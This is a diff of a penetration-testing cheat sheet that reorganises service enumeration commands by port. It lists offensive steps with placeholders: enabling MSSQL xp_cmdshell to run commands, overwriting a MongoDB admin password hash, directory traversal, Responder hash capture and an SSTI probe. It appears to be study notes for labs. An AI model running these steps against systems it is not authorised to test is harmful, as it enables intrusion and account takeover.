@@ -22,7 +22,7 @@ $ nmap --top-ports=100 <IP address>
 $ nmap <IP address> --script vuln
 ```
 
-- FTP
+- FTP (port 21)
 
 ```
 $ ftp <IP address> (anonymous:anonymous)
@@ -31,13 +31,29 @@ ftp> get <file>
 ftp> put <file>
 ```
 
-- Telnet
+- Telnet (port 23)
 
 ```
 $ telnet <IP address>
 ```
 
-- Smbclient
+- TFTP (udp/port 69)
+
+```
+$ tftp <IP address>
+tftp> get <file>
+tftp> put <file>
+```
+
+- Gobuster (port 80)
+
+```
+$ gobuster dir -w <wordlist> -u <URL>
+$ gobuster dir -w <wordlist> -u <URL> -x php,html
+$ gobuster vhost -w <wordlist> -u <URL>
+```
+
+- Smbclient (port 445)
 
 ```
 $ smbclient -L <IP address>
@@ -46,44 +62,7 @@ $ smbclient \\\\<IP address>\\c$
 $ smbclient \\\\<IP address>\\c$ -U <username>
 ```
 
-- Redis-cli
-
-```
-$ redis-cli -h <IP address>
-<IP address>:6379> select <db number e.g. 0>
-<IP address>:6379> keys *
-<IP address>:6379> get <key>
-```
-
-- Xfreerdp
-
-```
-$ xfreerdp /v:<IP address>
-$ xfreerdp /v:<IP address> /u:Administrator
-$ freerdp /v:<IP address> /cert:ignore /u:Administrator
-```
-
-- Gobuster
-
-```
-$ gobuster dir -w <wordlist> -u <URL>
-$ gobuster dir -w <wordlist> -u <URL> -x php,html
-$ gobuster vhost -w <wordlist> -u <URL>
-```
-
-- MongoDB
-
-```
-$ ./mongo mongodb://<IP address>:27017
-> show dbs;
-> use <db name>;
-> show collections;
-> db.<collection>.find().pretty();
-$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
-$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<Object ID>")},{$set:{"x_shadow":"<SHA-512 hash>"}})'
-```
-
-- Rsync
+- Rsync (port 873)
 
 ```
 $ rsync --list-only <IP address>::
@@ -91,15 +70,16 @@ $ rsync --list-only <IP address>::<share>
 $ rsync <IP address>::<share>/<filename> <filename>
 ```
 
-- TFTP
+- MSSQL (port 1433)
 
 ```
-$ tftp <IP address>
-tftp> get <file>
-tftp> put <file>
+$ python3 mssqlclient.py <domain>/<username>@<IP address> -windows-auth
+SQL> SELECT is_srvrolemember('sysadmin');
+SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+SQL> EXEC xp_cmdshell "whoami";
 ```
 
-- MySQL
+- MySQL (port 3306)
 
 ```
 $ mysql -h <IP address> -u root
@@ -109,42 +89,15 @@ MariaDB [(none)]> SHOW tables;
 MariaDB [(none)]> SELECT * FROM <table name>;
 ```
 
-- MSSQL
+- Xfreerdp (port 3389)
 
 ```
-$ python3 mssqlclient.py <domain>/<username>@<IP address> -windows-auth
-SQL> SELECT is_srvrolemember('sysadmin');
-SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-SQL> EXEC xp_cmdshell "whoami";
+$ xfreerdp /v:<IP address>
+$ xfreerdp /v:<IP address> /u:Administrator
+$ freerdp /v:<IP address> /cert:ignore /u:Administrator
 ```
 
-- AWS
-
-```
-$ aws --endpoint=<URL> s3 ls
-$ aws --endpoint=<URL> s3 ls s3://<S3 bucket name>
-$ aws --endpoint=<URL> s3 cp <filename> s3://<S3 bucket name>
-```
-
-- Curl
-
-```
-$ curl -v <URL>
-```
-
-- Wget
-
-```
-$ wget http://<IP address>/<file> -outfile <file>"
-```
-
-- Server Side Template Injection (SSTI)
-
-```
-${7*7}
-```
-
-- PostgreSQL
+- PostgreSQL (port 5432)
 
 ```
 $ psql -h <IP address> -U <username> -p <password>
@@ -154,10 +107,25 @@ $ psql -h <IP address> -U <username> -p <password>
 <username>=# SELECT * FROM <table>;
 ```
 
-- Jenkins
+- Redis-cli (port 6379)
 
 ```
-http://<domain name>/script
+$ redis-cli -h <IP address>
+<IP address>:6379> select <db number e.g. 0>
+<IP address>:6379> keys *
+<IP address>:6379> get <key>
+```
+
+- MongoDB (port 27017/27117)
+
+```
+$ ./mongo mongodb://<IP address>:27017
+> show dbs;
+> use <db name>;
+> show collections;
+> db.<collection>.find().pretty();
+$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<Object ID>")},{$set:{"x_shadow":"<SHA-512 hash>"}})'
 ```
 
 #2. - Exploitation
@@ -174,6 +142,12 @@ http://<domain name>/<page>?page=../../../../../../../../windows/system32/driver
 ```
 sudo responder -I <network interface>
 http://<domain name>/<page>?page=//<IP address>/somefile
+```
+
+- Server Side Template Injection (SSTI)
+
+```
+${7*7}
 ```
 
 - Webshell
